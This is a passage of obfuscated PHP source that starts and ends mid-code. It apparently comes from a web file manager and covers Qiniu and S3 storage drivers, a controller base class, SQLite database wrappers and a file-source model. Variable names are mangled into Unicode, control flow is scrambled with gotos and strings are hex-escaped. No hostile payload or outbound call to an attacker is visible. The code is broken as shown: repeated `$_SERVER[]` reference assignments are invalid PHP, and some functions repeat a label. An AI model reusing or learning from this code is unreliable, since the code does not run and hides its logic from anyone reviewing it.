$c[$c[196]] = !0; $fϢ = rtrim($fϢ, $c[8]) . $c[8]; goto F֝; aܸ: $c =& $_SERVER[]; $c = array($c[28] => $this->pathThis($fϢ), $c[76] => $this->getPathOuter($c[8] . $fϢ), $c[29] => $c[77]); if ($EМⷧ̿) { return $c; } goto Bі; F֝: $f = $this->objectMeta($fϢ); if (isset($f[$c[1307]])) { $c[$c[84]] = substr($f[$c[1307]] . $c[33], 0, 10); } return $c; goto a瑦; a瑦: } public function listPath($F, $Eկ = false) { $cą =& $_SERVER[]; $f屶 = $this->fileList($F, $cą[8], !0); foreach ($f屶[$cą[75]] as $D => $b´) { $f屶[$cą[75]][$D] = $this->folderInfo($b´, $Eկ); } foreach ($f屶[$cą[74]] as $D => $b´) { $f屶[$cą[74]][$D] = $this->fileInfo($b´[$cą[93]], $Eկ, $b´); } return $f屶; } public function has($B, $A˸Ņ֤ = false, $BŐ贕 = true) { goto dֱ҅; dֱ҅: $aӨ݃ =& $_SERVER[]; $B = trim($B, $aӨ݃[8]); $Aڎѡ = empty($B) && $B !== $aӨ݃[191] ? $aӨ݃[33] : $B . $aӨ݃[8]; goto cѐ; f밄: $e獎 = $bޭ = 0; while (!0) { check_abort(); list($Fߣ, $f) = $this->bucketManager->listFiles($this->bucket, $Aڎѡ, $Eߙ, $Eż, $c); if ($f) { break; } $Eߙ = array_key_exists($aӨ݃[1277], $Fߣ) ? $Eߙ = $Fߣ[$aӨ݃[1308]] : $aӨ݃[33]; if ($A˸Ņ֤) { if (!empty($Fߣ[$aӨ݃[1309]])) { $e獎 += count($Fߣ[$aӨ݃[1309]]); } if (!empty($Fߣ[$aӨ݃[1310]])) { $bޭ += count($Fߣ[$aӨ݃[1310]]); } if ($Eߙ === $aӨ݃[33]) { break; } continue; } if ($BŐ贕) { if (!empty($Fߣ[$aӨ݃[1309]])) { return !0; } } else { if (!empty($Fߣ[$aӨ݃[1310]])) { return !0; } } if ($Eߙ === $aӨ݃[33]) { break; } } if ($A˸Ņ֤) { return array($aӨ݃[203] => $e獎, $aӨ݃[204] => $bޭ); } goto c櫺; c櫺: return !1; goto cܢ; cѐ: $Eߙ = $aӨ݃[33]; $Eż = 500; $c = $aӨ݃[8]; goto f밄; cܢ: } public function listAll($c) { $E칛 =& $_SERVER[]; $BͫԞ = $this->fileList($c, $E칛[33], !0); $eׇǂ = array(); foreach ($BͫԞ[$E칛[74]] as $D¬) { $eׇǂ[$D¬[$E칛[93]]] = $D¬[$E칛[78]]; } foreach ($BͫԞ[$E칛[75]] as $D¬) { if (is_string($D¬)) { $eׇǂ[$D¬] = 0; } } return $this->listAllFiles($c, array_keys($eׇǂ), $eׇǂ); } private function fileList($CŅ, $b = '', $cϥ = 0) { goto d; F㢒ڋ: $aݧ = $fč[33]; $DѨ = 1000; $f׋ = $this->listItemCache === !1 ? !1 : !0; goto eᝣ; E֮⌐: return array($fč[75] => $dȋ, $fč[74] => $bĂ); goto a; eᝣ: $dȋ = $bĂ = array(); while (!0) { check_abort(); list($c, $a) = $this->bucketManager->listFiles($this->bucket, $a펇, $aݧ, $DѨ, $b); if ($a) { break; } $aݧ = array_key_exists($fč[1277], $c) ? $aݧ = $c[$fč[1308]] : $fč[33]; $FԷ۟ = isset($c[$fč[1309]]) ? $c[$fč[1309]] : array(); $b = isset($c[$fč[1310]]) ? $c[$fč[1310]] : array(); foreach ($FԷ۟ as $F莧) { goto d̹; d̹: if ($F莧[$fč[93]] == $a펇) { continue; } $fȖ = $F莧[$fč[93]]; $Bœ؟ = $F莧[$fč[1306]]; goto b; f镕: if ($D؎) { $dȋ[] = $fȖ; continue; } $bĂ[] = $cϥ ? $F莧 : $fȖ; goto Aۃ; b: $F莧[$fč[78]] = $Bœ؟; $D؎ = $Bœ؟ == 0 && substr($fȖ, strlen($fȖ) - 1, 1) == $fč[8] ? !0 : !1; if ($f׋) { $this->cacheMethod($fč[199], $fȖ, $D؎); $this->cacheMethod($fč[200], $fȖ, $F莧); } goto f镕; Aۃ: } foreach ($b as $fȖ) { if ($fȖ == $a펇) { continue; } $dȋ[] = $fȖ; if ($f׋) { $this->cacheMethod($fč[199], $fȖ, !0); } } if ($aݧ === $fč[33]) { break; } } if ($f׋) { $this->cacheMethod($fč[199], $CŅ, !0); } goto E֮⌐; d: $fč =& $_SERVER[]; $CŅ = trim($CŅ, $fč[8]); $a펇 = empty($CŅ) && $CŅ !== $fč[191] ? $fč[33] : $CŅ . $fč[8]; goto F㢒ڋ; a: } public function canRead($d) { return $this->exist($d) ? !0 : !1; } public function canWrite($FҨד) { return $this->exist($FҨד) ? !0 : !1; } public function getContent($cշѳΓ) { return $this->fileSubstr($cշѳΓ, 0, -1); } public function setContent($f, $D܋ = '') { $Cؔ = $this->tempFile($this->pathThis($f)); file_put_contents($Cؔ, $D܋); if ($this->upload($f, $Cؔ)) { $this->tempFileRemve($Cؔ); return !0; } return !1; } public function refreshUrls($Fݮ) { goto d൶; d൶: $Bͺ =& $_SERVER[]; $dݎ = array(); if (is_array($Fݮ)) { foreach ($Fݮ as $ḅ) { $dݎ[] = $this->link($ḅ); } } else { $dݎ[] = $this->link($Fݮ); } goto bކ; bކ: $B = new Qiniu\Cdn\CdnManager($this->auth); list($a, $c) = $B->refreshUrls($dݎ); if ($c) { return !1; } goto aϧ; aϧ: return $a[$Bͺ[1079]] == $Bͺ[725] ? !0 : !1; goto b; b: } public function fileSubstr($E܉Ո, $c, $f硻) { $Eϩ݅ =& $_SERVER[]; if (!($eʬ = $this->link($E܉Ո))) { return !1; } $e = !1; if ($f硻 > 0) { $cɨ = $c + $f硻 - 1; $e = array($Eϩ݅[1311] . $c . $Eϩ݅[440] . $cɨ); } $eп = url_request($eʬ, $Eϩ݅[228], !1, $e); return $eп[$Eϩ݅[715]] ? $eп[$Eϩ݅[1091]] : !1; } public function upload($Bŧ݆, $E̺, $D = false, $c܈є = REPEAT_REPLACE) { $A = new Qiniu\Storage\UploadManager(); $D냸 = $this->auth->uploadToken($this->bucket, $Bŧ݆); $B귌 = get_file_mime(get_path_ext($E̺)); list($e氎, $F) = $A->putFile($D냸, $Bŧ݆, $E̺, null, $B귌); return $F ? !1 : $this->getPathOuter($Bŧ݆); } public function uploadFormData($A, $b = 3600) { return $this->uploadToken($A, $b); } public function multiUploadFormData($b慖, $e = 3600) { return $this->uploadToken($b慖, $e); } private function uploadToken($Dق, $FӮ = 3600) { goto f; fӮՂ: $C㙹 = $Dق; $bն = $this->auth->uploadToken($this->bucket, $C㙹, $f, $b산, !0); $F = empty($this->region) || $this->region == $Aϧݜ[1314] ? $Aϧݜ[33] : $Aϧݜ[440] . $this->region; goto D; D: $E = http_type() . "\x3a\x2f\x2f\165\x70\x6c\157\141\x64{$F}\56\x71\x69\156\151\x75\x70\56\x63\157\x6d\57"; return array($Aϧݜ[1315] => $bն, $Aϧݜ[1316] => $E); goto aԈ; f: $Aϧݜ =& $_SERVER[]; $f = $FӮ; $b산 = array($Aϧݜ[1312] => $Aϧݜ[1313]); goto fӮՂ; aԈ: } public function download($Aљ, $Dĭ) { goto B朓; F׺: fclose($FƋ); return $Dĭ; goto f; fཏ羊: $bǸ = 1024 * 200; $FƋ = fopen($B׆, $_SERVER[][1317]); while (!0) { $b舮 = $this->fileSubstr($Aљ, $Cܥа, $bǸ); if ($b舮 === !1) { return !1; } fwrite($FƋ, $b舮); $Cܥа += $bǸ; if (strlen($b舮) < $bǸ) { break; } } goto F׺; B朓: $B׆ = IO::getPathInner(IO::mkfile($Dĭ)); if (!($bĈ = $this->link($Aљ))) { return !1; } $Cܥа = 0; goto fཏ羊; f: } public function link($eԔ, $E珃˳ = '') { if (!$this->isFile($eԔ)) { return !1; } $D煡 = $this->getHost() . $_SERVER[][8] . $this->pathEncode($eԔ) . $E珃˳; return $this->auth->privateDownloadUrl($D煡, 3600 * 12); } public function fileOut($C, $BͿ = false, $B׍փ = false, $fڕ͛ = '') { $B鏇 =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($C, $BͿ, $B׍փ, $fڕ͛); } if (!$B׍փ) { $B׍փ = $this->pathThis($C); } $Fѯ͌ = $BͿ ? $B鏇[1318] . rawurlencode($B׍փ) : $B鏇[33]; $a = $this->link($C, $Fѯ͌); $this->fileOutLink($a); } public function fileOutServer($D鿄ʛ, $dó = false, $f鲊 = false, $D = '') { parent::fileOut($D鿄ʛ, $dó, $f鲊, $D); } public function fileOutImage($cŲ, $Dӏ = 250) { $f = $this->link($cŲ, $_SERVER[][1319] . $Dӏ); $this->fileOutLink($f); } public function fileOutImageServer($b򙂖ѳ, $aǷ = 250) { parent::fileOutImage($b򙂖ѳ, $aǷ); } public function hashMd5($Aֆ) { $a﫢 =& $_SERVER[]; $aȋ = $this->objectMeta($Aֆ); return isset($aȋ[$a﫢[208]]) ? $aȋ[$a﫢[208]] : !1; $F = $this->link($Aֆ, $a﫢[1320]); } public function size($eن) { $d䰈Ҕ = $this->objectMeta($eن); return $d䰈Ҕ ? $d䰈Ҕ[$_SERVER[][78]] : 0; } public function info($b) { if ($this->isFolder($b)) { return $this->folderInfo($b); } else { if ($this->isFile($b)) { return $this->fileInfo($b); } } return !1; } public function exist($dˍ) { return $this->isFile($dˍ) || $this->isFolder($dˍ); } public function isFile($b˭ݚ) { return !$this->isFolder($b˭ݚ) && $this->objectMeta($b˭ݚ); } public function isFolder($E񑑈) { return $this->cacheMethod($_SERVER[][199], $E񑑈); } protected function objectMeta($D) { return $this->cacheMethod($_SERVER[][200], $D); } protected function _objectMeta($bܸ) { $dʝ =& $_SERVER[]; list($CŎƫ, $E) = $this->bucketManager->stat($this->bucket, $bܸ); if ($CŎƫ) { $CŎƫ[$dʝ[78]] = intval($CŎƫ[$dʝ[1306]]); } return $CŎƫ; } protected function _isFolder($e㗡) { $B۱ =& $_SERVER[]; if ($e㗡 == $B۱[33] || $e㗡 == $B۱[8]) { return !0; } list($aˍҢ, $B) = $this->bucketManager->listFiles($this->bucket, trim($e㗡, $B۱[8]) . $B۱[8], $B۱[33], 1, $B۱[8]); return !empty($aˍҢ[$B۱[1309]]) || !empty($aˍҢ[$B۱[1310]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Fޔʢ) { parent::__construct($Fޔʢ); } public function uploadFormData($c噗, $aӰ = 3600) { goto eҵ; eҵ: $E =& $_SERVER[]; $D = $E[192]; $cח = $E[1227]; goto dĵ; dĵ: $fޛ = $E[59]; $c؎ = gmdate($E[1228]); $DՆ = gmdate($E[716]); goto d󍃂; fބ: $bȭ = array($this->accessKey, $DՆ, $this->region, $fޛ, $Bݔ); $E橡 = implode($E[8], $bȭ); $e = array($E[1194] => gmdate($E[1193], strtotime($E[1230])), $E[1195] => array(array($E[1197] => $this->bucket), array($E[1196] => $D), array($E[1198], $E[1199], $E[33]), array($E[1198], $E[1231], $E[33]), array($E[1198], $E[1232], $E[33]), array($E[1200] => $DĴ), array($E[1233] => $E橡), array($E[1234] => $cח), array($E[1235] => $c؎), array($E[1236] => $eѶ))); goto BТ܌; B弑: $e폧 = hash_hmac($E[1237], $fޛ, $fݮƴ, !0); $CƂ֍ = hash_hmac($E[1237], $Bݔ, $e폧, !0); $E = hash_hmac($E[1237], $e͏, $CƂ֍); goto Eһ; Eһ: $AאѮ = array($E[211] => $E[33], $E[1239] => $E[33], $E[1196] => $D, $E[1200] => $DĴ, $E[1204] => $e͏, $E[1240] => $E橡, $E[1241] => $cח, $E[1242] => $c؎, $E[1243] => $eѶ, $E[1244] => $E, $E[175] => $this->getHost()); return $AאѮ; goto AڪЋ; BТ܌: $e͏ = base64_encode(json_encode($e)); $F = hash_hmac($E[1237], $DՆ, $E[1238] . $this->secret, !0); $fݮƴ = hash_hmac($E[1237], $this->region, $F, !0); goto B弑; d󍃂: $Bݔ = $E[1229]; $eѶ = $aӰ . $E[33]; $DĴ = $E[1192]; goto fބ; AڪЋ: } public function multiUploadFormData($c׾, $b獗 = 3600) { $F㉝Ӈ =& $_SERVER[]; $C = gmdate($F㉝Ӈ[1321]); $d = array(); $Aܬ = $this->client->getUploadId($this->bucket, $c׾, $d); if (!$Aܬ) { return !1; } return array($F㉝Ӈ[221] => $Aܬ, $F㉝Ӈ[175] => $this->getHost() . $F㉝Ӈ[8] . $this->pathEncode($c׾), $F㉝Ӈ[222] => $C, $F㉝Ӈ[93] => $c׾); } public function multiUploadAuthData($A֟, $e = array()) { goto Cޅ; Cޅ: $Fý =& $_SERVER[]; $Eʺ钵 = isset($e[$Fý[168]]) ? $e[$Fý[168]] : $Fý[33]; $D = $e[$Fý[93]]; goto e; cڸ筅: $e攑 = $Fý[226]; $bߣ = $Fý[8] . $this->pathEncode($D) . $Eʺ钵; $b = $this->client->__getSignatureV4($F숎, $c, $e攑, $bߣ); goto aɋ; e: unset($e[$Fý[93]]); if (isset($e[$Fý[223]])) { return $this->listUploadParts($D, $e); } $F숎 = array(); goto f; aɋ: if (strpos($Eʺ钵, $Fý[225]) === 0) { if (isset($F숎[$Fý[1323]])) { $dΊ = $F숎[$Fý[1323]]; } else { if (isset($b[$Fý[1323]])) { $dΊ = $b[$Fý[1323]]; } else { $dΊ = hash($Fý[1237], $Fý[33]); } } return array($Fý[232] => $b[$Fý[232]], $Fý[1323] => $dΊ, $Fý[222] => $b[$Fý[1326]]); } return $b[$Fý[232]]; goto dԩꝤ; f: if (isset($e[$Fý[1322]])) { $F숎[$Fý[1323]] = $e[$Fý[1322]]; } $D = explode($Fý[177], $this->getHost()); $c = array($Fý[1324] => $D[1], $Fý[1325] => $Fý[33], $Fý[211] => $Fý[119], $Fý[1239] => $e[$Fý[78]]); goto cڸ筅; dԩꝤ: } public function listUploadParts($dӮ, $Fڻ = array()) { goto D; a觵: $Dّ .= $eܭ[1330]; $D = array(); $aͦ = explode($eܭ[177], $this->getHost()); goto dǑݵ; D: $eܭ =& $_SERVER[]; $e՗ = str_replace($eܭ[233], $eܭ[33], $Fڻ[$eܭ[168]]); $c«隻 = $this->client->listParts($this->bucket, $dӮ, $e՗); goto dӐ; dǑݵ: $D䜤 = array($eܭ[1324] => $aͦ[1], $eܭ[211] => $eܭ[119], $eܭ[1239] => strlen($Dّ)); $eئꨭ = $eܭ[224]; $F녇 = $eܭ[8] . $this->pathEncode($dӮ) . $Fڻ[$eܭ[168]]; goto Cٛ; dӐ: if (!$c«隻) { return !1; } $Dّ = $eܭ[1327]; foreach ($c«隻 as $F밡) { $Dّ .= $eܭ[1328] . "\x3c\120\141\x72\164\116\165\x6d\x62\145\162\x3e{$F밡[$eܭ[1284]]}\74\x2f\120\141\x72\x74\116\x75\155\x62\x65\162\76\12" . "\x3c\105\x54\x61\147\x3e{$F밡[$eܭ[1285]]}\74\x2f\105\x54\141\147\76\12" . $eܭ[1329]; } goto a觵; Cٛ: $bէ둆 = $this->client->__getSignatureV4($D, $D䜤, $eئꨭ, $F녇, $Dّ); return array($eܭ[232] => $bէ둆[$eܭ[232]], $eܭ[222] => $bէ둆[$eܭ[1326]], $eܭ[234] => $c«隻, $eܭ[1323] => $bէ둆[$eܭ[1323]]); goto A; A: } public function link($f, $Aۏ = array()) { return parent::link($f, $Aۏ); } public function fileOut($Cڑލ, $d̏ݗ = false, $d͊ = false, $F¡ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[][1331])) { return parent::fileOutServer($Cڑލ, $d̏ݗ, $d͊, $F¡); } parent::fileOut($Cڑލ, $d̏ݗ, $d͊, $F¡); } public function fileOutImage($Cë, $CٞǼ = 250) { if (strstr($this->endpoint, $_SERVER[][1331])) { return parent::fileOutImageServer($Cë, $CٞǼ); } parent::fileOutImage($Cë, $CٞǼ); } public function fileOutLink($a) { $c紋 =& $_SERVER[]; if (substr($a, 0, 7) == $c紋[1207]) { $a = $c紋[1208] . substr($a, 7); } header($c紋[159] . $a); die; } public function getHost() { $D؍ =& $_SERVER[]; $c̡䇻 = str_rtrim(parent::getHost(), $D؍[8] . $this->bucket); $c̡䇻 = explode($D؍[177], $c̡䇻); return $c̡䇻[0] . $D؍[177] . $this->bucket . $D؍[95] . $c̡䇻[1]; } } goto b; e: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto cϡ; aӫ: $this->tpl = TEMPLATE . MOD . $e[8]; $this->_classObjectID = mt_rand(0, 10000); goto Dٖ; f: $this->in =& $in; $this->values[$e[6]] =& $config; $this->values[$e[7]] =& $in; goto aӫ; cϡ: $e =& $_SERVER[]; global $in, $config; $this->config =& $config; goto f; Dٖ: } public function loadClass($C) { if (1 === func_num_args()) { $this->{$C} = new $C(); } else { $e綋Ε = new ReflectionClass($C); $dܭ = func_get_args(); array_shift($dܭ); $this->{$C} = $e綋Ε->newInstanceArgs($dܭ); } return $this->{$C}; } protected function assign($E, $D) { $this->values[$E] = $D; } protected function display($Aӎ) { ob_end_clean(); extract($this->values); require $this->tpl . $Aӎ; } } class DbSqliteBase extends Db { public function __construct($F؏񿠌 = '') { $eʮ߿ =& $_SERVER[]; if (!extension_loaded($eʮ߿[9])) { think_exception(think_lang($eʮ߿[10]) . $eʮ߿[11]); } if (!empty($F؏񿠌)) { if (!isset($F؏񿠌[$eʮ߿[12]])) { $F؏񿠌[$eʮ߿[12]] = 438; } $this->config = $F؏񿠌; if (empty($this->config[$eʮ߿[13]])) { $this->config[$eʮ߿[13]] = array(); } } } public function connect($A = '', $dಗ = 0) { $f֊ڪ =& $_SERVER[]; if (!isset($this->linkID[$dಗ])) { goto C݆; d҅: @sqlite_busy_timeout($this->linkID[$dಗ], 30000); if (1 != think_config($f֊ڪ[18])) { unset($this->config); } goto eϰϊ; DѮ: $this->linkID[$dಗ] = $a($A[$f֊ڪ[17]], $A[$f֊ڪ[12]]); if (!$this->linkID[$dಗ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto d҅; C݆: if (empty($A)) { $A = $this->config; } $cב = !empty($A[$f֊ڪ[13]][$f֊ڪ[14]]) ? $A[$f֊ڪ[13]][$f֊ڪ[14]] : $this->pconnect; $a = $cב ? $f֊ڪ[15] : $f֊ڪ[16]; goto DѮ; eϰϊ: } return $this->linkID[$dಗ]; } public function free() { $this->queryID = null; } public function query($B) { goto E; D¯: think_status($eڶ[20]); $this->queryID = sqlite_query($this->_linkID, $B); $this->debug(); goto c; E: $eڶ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fƊ; fƊ: $this->queryStr = $B; if ($this->queryID) { $this->free(); } think_action_status($eڶ[19], 1); goto D¯; c: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $A = $this->getAll(); return $A; } goto Cη; Cη: } public function execute($fϧ) { goto cٌ׌; F: $this->queryStr = $fϧ; if ($this->queryID) { $this->free(); } think_action_status($BÂ[21], 1); goto F횪ް; cٌ׌: $BÂ =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F; aӨÌ: if (!1 === $D̛) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto F; F횪ް: think_status($BÂ[20]); $D̛ = sqlite_exec($this->_linkID, $fϧ); $this->debug(); goto aӨÌ; F: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fƂ = sqlite_query($this->_linkID, $_SERVER[][23]); if (!$fƂ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $f͐߃ = sqlite_query($this->_linkID, $_SERVER[][24]); if (!$f͐߃) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $eʾѶ = array(); if ($this->numRows > 0) { for ($e = 0; $e < $this->numRows; $e++) { $eʾѶ[$e] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $eʾѶ; } public function getFields($A) { $AΌё =& $_SERVER[]; $b = $this->query($AΌё[25] . $A . $AΌё[26]); $F = array(); if ($b) { foreach ($b as $E => $A) { $F[$A[$AΌё[27]]] = array($AΌё[28] => $A[$AΌё[27]], $AΌё[29] => $A[$AΌё[30]], $AΌё[31] => (bool) ($A[$AΌё[32]] === $AΌё[33]), $AΌё[34] => $A[$AΌё[35]], $AΌё[36] => strtolower($A[$AΌё[37]]) == $AΌё[38], $AΌё[39] => strtolower($A[$AΌё[40]]) == $AΌё[41]); } } return $F; } public function getTables($D½ = '') { $aɂ =& $_SERVER[]; $c˜̈́ = $this->query($aɂ[42] . $aɂ[43] . $aɂ[44]); $A˲ = array(); foreach ($c˜̈́ as $a => $b) { $A˲[$a] = current($b); } return $A˲; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Cõ =& $_SERVER[]; $c羴 = sqlite_last_error($this->_linkID); $this->error = $c羴 . $Cõ[4] . sqlite_error_string($c羴); if ($Cõ[33] != $this->queryStr) { $this->error .= LNG($Cõ[45]) . $this->queryStr; } think_trace($this->error, $Cõ[33], $Cõ[46]); return $this->error; } public function escapeString($c) { return sqlite_escape_string($c); } public function parseLimit($b߮) { $Fƥ =& $_SERVER[]; $b˝ǂ = $Fƥ[33]; if (!empty($b߮)) { $b߮ = explode($Fƥ[47], $b߮); if (count($b߮) > 1) { $b˝ǂ .= $Fƥ[48] . $b߮[1] . $Fƥ[49] . $b߮[0] . $Fƥ[50]; } else { $b˝ǂ .= $Fƥ[48] . $b߮[0] . $Fƥ[50]; } } return $b˝ǂ; } } class DbSqlite3Base extends Db { public function __construct($F = '') { $ań̌ =& $_SERVER[]; if (!class_exists($ań̌[51])) { think_exception(think_lang($ań̌[10]) . $ań̌[52]); } if (!empty($F)) { if (!isset($F[$ań̌[12]])) { $F[$ań̌[12]] = 438; } $this->config = $F; if (empty($this->config[$ań̌[13]])) { $this->config[$ań̌[13]] = array(); } } } public function connect($cɂы = '', $D݅ = 0) { $E =& $_SERVER[]; if (!isset($this->linkID[$D݅])) { if (empty($cɂы)) { $cɂы = $this->config; } $this->linkID[$D݅] = new SQLite3($cɂы[$E[17]]); if (!$this->linkID[$D݅]) { think_exception($this->linkID[$D݅]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$D݅]->busyTimeout(30000); if (1 != think_config($E[18])) { unset($this->config); } } return $this->linkID[$D݅]; } public function free() { $this->queryID = null; } public function query($ȁ) { goto bﾴ; bﾴ: $aɶ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto b; b: $this->queryStr = $ȁ; if ($this->queryID) { $this->free(); } think_action_status($aɶ[19], 1); goto dƯ; c: if (!1 === $this->queryID) { $this->error(); return !1; } else { $F튂 = $this->getAll(); $this->numRows = count($F튂); return $F튂; } goto aק; dƯ: think_status($aɶ[20]); $this->queryID = $this->_linkID->query($ȁ); $this->debug(); goto c; aק: } public function execute($FɎ) { goto BӔ; b: if (!1 === $F膅) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto A; Eˎ: think_status($aض[20]); $F膅 = $this->_linkID->exec($FɎ); $this->debug(); goto b; BӔ: $aض =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Aݲ; Aݲ: $this->queryStr = $FɎ; if ($this->queryID) { $this->free(); } think_action_status($aض[21], 1); goto Eˎ; A: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E = $this->_linkID->query($_SERVER[][23]); if (!$E) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $dҞ = $this->_linkID->query($_SERVER[][24]); if (!$dҞ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B = array(); while ($Eƅ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $B[] = $Eƅ; } $this->queryID->reset(); return $B; } public function getFields($c˔) { $Fӄ =& $_SERVER[]; $f؃ = $this->query($Fӄ[25] . $c˔ . $Fӄ[26]); $dϚ = array(); if ($f؃) { foreach ($f؃ as $EՔ => $D) { $dϚ[$D[$Fӄ[28]]] = array($Fӄ[28] => $D[$Fӄ[28]], $Fӄ[29] => $D[$Fӄ[29]], $Fӄ[31] => (bool) ($D[$Fӄ[31]] === $Fӄ[33]), $Fӄ[34] => $D[$Fӄ[53]], $Fӄ[36] => (bool) $D[$Fӄ[54]], $Fӄ[39] => (bool) $D[$Fӄ[54]]); } } return $dϚ; } public function getTables($Eڂԏ = '') { $A׏ =& $_SERVER[]; $C­ = $this->query($A׏[42] . $A׏[43] . $A׏[44]); $Bç = array(); foreach ($C­ as $Aݕ => $Cυ) { $Bç[$Aݕ] = current($Cυ); } return $Bç; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Fᴛ߅ =& $_SERVER[]; $this->error = $this->_linkID->lastErrorMsg(); if ($Fᴛ߅[33] != $this->queryStr) { $this->error .= LNG($Fᴛ߅[45]) . $this->queryStr; } think_trace($this->error, $Fᴛ߅[33], $Fᴛ߅[46]); return $this->error; } public function escapeString($e乻ۉ) { $cו֊ =& $_SERVER[]; if ($this->_linkID) { return $this->_linkID->escapeString($e乻ۉ); } return str_ireplace($cו֊[55], $cו֊[56], $e乻ۉ); } public function parseLimit($eňϦ) { $eܓ =& $_SERVER[]; $B = $eܓ[33]; if (!empty($eňϦ)) { $eňϦ = explode($eܓ[47], $eňϦ); if (count($eňϦ) > 1) { $B .= $eܓ[48] . $eňϦ[1] . $eܓ[49] . $eňϦ[0] . $eܓ[50]; } else { $B .= $eܓ[48] . $eňϦ[0] . $eܓ[50]; } } return $B; } } goto dɼ; a: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\x72\x63\145"; protected $tableMeta = array("\164\x61\142\x6c\145\116\141\x6d\145" => "\x69\157\137\x73\157\165\162\x63\145\x5f\x6d\145\164\141", "\155\x65\x74\141\106\151\x65\154\x64" => "\163\157\165\162\x63\145\x49\104"); protected $dataAuto = array(array("\x6d\157\144\151\x66\171\124\x69\155\x65", "\x74\x69\155\145", "\x69\156\163\145\x72\x74", "\146\165\x6e\143\x74\151\x6f\x6e"), array("\143\x72\x65\141\164\145\x54\x69\x6d\x65", "\x74\151\155\145", "\151\156\163\145\x72\x74", "\x66\x75\156\143\x74\151\157\156"), array("\x76\151\x65\x77\124\151\x6d\x65", "\164\151\155\145", "\x69\x6e\163\145\162\164", "\146\x75\156\x63\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($eϷƳֳ) { return $this->listSource(array($_SERVER[][394] => $eϷƳֳ)); } public function typeName($FѢ) { static $e = array(self::TYPE_SYSTEM => "\x73\x79\163\164\x65\155", self::TYPE_USER => "\165\x73\145\162", self::TYPE_GROUP => "\x67\162\157\165\160"); return $e[$FѢ . $_SERVER[][33]]; } public function sourceListInfo($F, $d = false) { goto Bۤ꒶; aӰ: return array_to_keyvalue($eʯ˶, $b[395]); goto e콟ғ; c: if (!$F) { return array(); } $eʯ˶ = $this->where(array($b[395] => array($b[7], $F)))->select(); $this->_listDataApply($eʯ˶, $d); goto aӰ; Bۤ꒶: $b =& $_SERVER[]; $F = $F ? $F : array(); $F = array_filter(array_unique($F)); goto c; e콟ғ: } public function pathInfoFilter(&$Fɍ) { goto e򤃼; dח: $Fɍ = array_field_key($Fɍ, $E); return $Fɍ; goto fۦϺ; f: if ($Fɍ[$E[403]] != 1) { $Fɍ[$E[168]] = $Fɍ[$E[405]]; unset($Fɍ[$E[405]]); } $E = $ẽ; if (isset($Fɍ[$E[406]]) && $Fɍ[$E[406]][$E[407]] == -1) { $E = $b; } goto dח; CǐԄ: static $f֍ = false; if (!$ẽ) { goto B̶; Fè: $d˛Ӎ = $E[399]; $D = explode($E[47], $d˛Ӎ); $ẽ = explode($E[47], $c܊); goto e; B̶: $c܊ = $E[396]; $c܊ .= $E[397]; $c܊ .= $E[398]; goto Fè; e: $b = array(); foreach ($ẽ as $a֚) { if (in_array($a֚, $D)) { continue; } $b[] = $a֚; } $f֍ = explode($E[47], $E[400]); goto Eȇ; Eȇ: } foreach ($f֍ as $B˾) { if (isset($Fɍ[$B˾])) { $Fɍ[$B˾] = intval($Fɍ[$B˾]); } } goto AߧՕ; AߧՕ: $Fɍ[$E[76]] = $E[401] . $Fɍ[$E[395]] . $E[402]; $Fɍ[$E[29]] = $Fɍ[$E[403]] == 1 ? $E[77] : $E[193]; $Fɍ[$E[404]] = $this->typeName($Fɍ[$E[404]]); goto f; e򤃼: $E =& $_SERVER[]; static $ẽ = false; static $b = false; goto CǐԄ; fۦϺ: } public function listUserFav() { goto c; a: $F = array_to_keyvalue($F, $eي[33], $eي[76]); if ($F) { $f≢ = $this->listSource(array($eي[410] => array($eي[411], $F))); } $f≢ = array_to_keyvalue($f≢[$eي[367]], $eي[395]); goto C; c: $eي =& $_SERVER[]; $f = Model($eي[408])->listData(); $F = array_filter_by_field($f, $eي[29], $eي[409]); goto a; C: foreach ($f as &$E) { $E = array($eي[412] => $E[$eي[393]], $eي[413] => $E[$eي[28]], $eي[414] => $E[$eي[76]], $eي[415] => $E[$eي[29]], $eي[416] => $E[$eي[194]], $eي[417] => $E[$eي[84]]); if 